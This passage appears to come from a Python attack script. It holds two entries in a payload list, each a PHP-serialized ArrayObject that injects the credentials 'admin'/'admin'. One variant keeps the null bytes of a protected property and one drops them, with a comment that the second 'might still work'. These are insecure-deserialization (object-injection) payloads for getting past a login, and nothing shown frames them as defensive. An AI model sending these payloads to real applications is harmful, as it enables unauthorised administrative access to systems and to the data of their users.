    ('AO_protected_storage', 'O:11:"ArrayObject":1:{s:14:"\x00*\x00storage";a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}}'),
    
    # ArrayObject without null bytes (might still work)
    ('AO_no_null', 'O:11:"ArrayObject":1:{s:7:"storage";a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}}'),
    
